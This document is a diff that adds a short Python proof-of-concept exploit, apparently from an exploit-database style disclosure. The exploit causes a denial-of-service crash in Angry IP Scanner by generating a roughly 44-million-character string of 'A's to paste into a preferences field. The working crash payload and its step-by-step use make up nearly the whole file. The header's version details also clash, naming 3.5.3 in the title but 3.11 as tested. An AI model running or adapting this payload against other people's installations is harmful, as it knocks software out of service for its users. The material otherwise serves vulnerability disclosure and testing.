@@ -1,0 +1,21 @@
+#!/usr/bin/python
+# -*- coding: cp1252 -*-
+# Exploit Title: Angry IP Scanner 3.5.3 Denial of Service (PoC)
+# Author: Fernando Cruz
+# Date: 13/12/2018
+# Vendor Homepage: https://angryip.org
+# Tested Version: 3.11
+# Tested on Windows 10 Pro, 64-bit
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python angryip.py
+# 2.- Open angryip.txt and copy content to clipboard
+# 3.- Open Angry IP Scanner
+# 4.- Go to "Herramientas" in toolbar, click on "Preferencias", then in the tap "Mostrar",
+# 5.- Paste ClipBoard on "El valor no está disponible (sin resultados):", and click on "OK",
+# 6.- Crashed
+
+buffer = "\x41" * 44455293
+f = open("angryip.txt" , 'w')
+f.write(buffer)
+f.close()
